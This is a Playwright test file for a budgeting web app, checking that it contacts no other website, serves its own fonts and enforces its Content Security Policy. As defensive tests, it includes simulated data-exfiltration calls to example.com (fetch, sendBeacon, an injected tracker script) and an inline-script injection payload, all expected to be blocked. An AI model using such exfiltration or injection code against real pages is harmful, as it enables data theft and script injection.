import { test, expect, openApp } from './helpers.js';

/** Uses most of the app: every tab, the entry and budget sheets, What's new and the monthly report. */
async function useTheApp(page) {
  for (const v of ['home', 'history', 'budgets', 'settings'])
    await page.click(`.tabs [data-act=nav][data-v=${v}]`);
  await page.click('#fab');
  await page.fill('#f-pay0', '3');
  await page.click('[data-act=fcat][data-v=coffee]');
  await page.click('[data-act=fsave]');
  await page.click('.tabs [data-act=nav][data-v=budgets]');
  await page.click('#v-budgets [data-act=newBudget]');
  await page.click('#sheet .sheet-head [data-act=close]');
  await page.click('.tabs [data-act=nav][data-v=settings]');
  await page.click('[data-act=showNews]');
  await page.click('#sheet .sheet-actions [data-act=close]');
  await page.click('.tabs [data-act=nav][data-v=history]');
  const download = page.waitForEvent('download');
  await page.click('[data-act=reportXlsx]');
  await download;
}

test('the app never contacts any other website', async ({ page, baseURL }) => {
  const origin = new URL(baseURL).origin;
  const elsewhere = [];
  page.on('request', (r) => {
    const u = new URL(r.url());
    if (!['http:', 'https:'].includes(u.protocol)) return; // blob: and data: never leave the phone
    if (u.origin !== origin) elsewhere.push(r.url());
  });
  await openApp(page);
  await page.evaluate(() => navigator.serviceWorker.ready);
  await page.reload();
  await page.waitForFunction(() => window.__qirsh);
  await useTheApp(page);
  expect(elsewhere).toEqual([]);
});

test('the fonts come from the app itself', async ({ page }) => {
  await openApp(page);
  await page.evaluate(() => document.fonts.ready);
  const loaded = await page.evaluate(() =>
    [...document.fonts].filter((f) => f.status === 'loaded').map((f) => f.family.replace(/"/g, '')),
  );
  expect(new Set(loaded)).toEqual(new Set(['Geist', 'Geist Mono']));
});

/** Records Content Security Policy violations from the first moment the page loads. */
const recordViolations = (page) =>
  page.addInitScript(() => {
    window.__csp = [];
    document.addEventListener('securitypolicyviolation', (e) =>
      window.__csp.push(e.violatedDirective + ' ' + e.blockedURI),
    );
  });

test('normal use never trips the Content Security Policy', async ({ page }) => {
  await recordViolations(page);
  await openApp(page);
  await useTheApp(page);
  await page.click('.tabs [data-act=nav][data-v=settings]');
  await page.click('[data-act=setAccent][data-v="#C23B5F"]');
  await page.click('[data-act=setTheme][data-v=dark]');
  expect(await page.evaluate(() => window.__csp)).toEqual([]);
});

test('the browser blocks any attempt to send data to another site', async ({ page, context }) => {
  // If anything got past the policy it would reach this route; a blocked request never does.
  const reached = [];
  await context.route('https://example.com/**', (route) => {
    reached.push(route.request().url());
    return route.fulfill({ status: 200, body: '' });
  });
  await recordViolations(page);
  await openApp(page);
  const attempts = await page.evaluate(async () => {
    const tryIt = (fn) =>
      Promise.resolve()
        .then(fn)
        .then(
          () => 'sent',
          () => 'blocked',
        );
    return {
      fetch: await tryIt(() => fetch('https://example.com/collect', { method: 'POST', body: 'x' })),
      // sendBeacon only reports that the data was queued; the policy blocks it after that.
      beacon: navigator.sendBeacon('https://example.com/beacon', 'x') && 'queued',
      script: await new Promise((resolve) => {
        const s = document.createElement('script');
        s.src = 'https://example.com/tracker.js';
        s.onload = () => resolve('sent');
        s.onerror = () => resolve('blocked');
        document.head.appendChild(s);
      }),
    };
  });
  expect(attempts).toEqual({ fetch: 'blocked', beacon: 'queued', script: 'blocked' });
  await expect
    .poll(() => page.evaluate(() => window.__csp.map((v) => v.split(' ')[0]).sort()))
    .toEqual(['connect-src', 'connect-src', 'script-src-elem']);
  expect(reached, 'requests that left the page').toEqual([]);
});

test('injected inline script does not run', async ({ page }) => {
  await openApp(page);
  await page.evaluate(() => {
    const d = document.createElement('div');
    d.innerHTML = '<img src="x" onerror="window.__ran = true">';
    document.body.appendChild(d);
  });
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => window.__ran)).toBeUndefined();
});
